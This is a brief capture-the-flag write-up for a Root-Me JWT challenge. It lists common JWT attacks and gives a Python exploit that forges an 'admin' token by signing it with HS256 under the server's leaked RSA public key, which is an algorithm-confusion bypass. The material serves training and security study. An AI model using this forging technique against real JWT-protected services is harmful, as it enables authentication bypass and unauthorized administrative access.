# JSON Web Token (JWT) - Public key

**References**:https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Hacking%20JSON%20Web%20Token%20(JWT)%20-%20Rudra%20Pratap.pdf

## Attacking JWT
1. The leakage of sensitive information
2. Modify the algorithm to none
3. Modify the algorithm RS256 to HS256 (leaked public key)
4. HS256 (symmetric encryption) key cracking

**Related tools**: https://github.com/jpadilla/pyjwt

## Exploit
```python
import requests
import jwt # pip install pyjwt==0.4.3

url = 'http://challenge01.root-me.org/web-serveur/ch60/'
s = requests.Session()

r1 = s.get(url+'key') # request lấy public key

public = "\n".join(requests.get(url + "key").json()) + "\n" # join từng phần tử với new-line

token = jwt.encode({"username":"admin"}, key=public, algorithm='HS256') # sign jwt token với pub key
print(token)

headers = {
	'Authorization': 'Bearer ' + token.decode()
}

r = s.post(url+'admin', headers=headers) # request lấy flag

print(r.text)
```
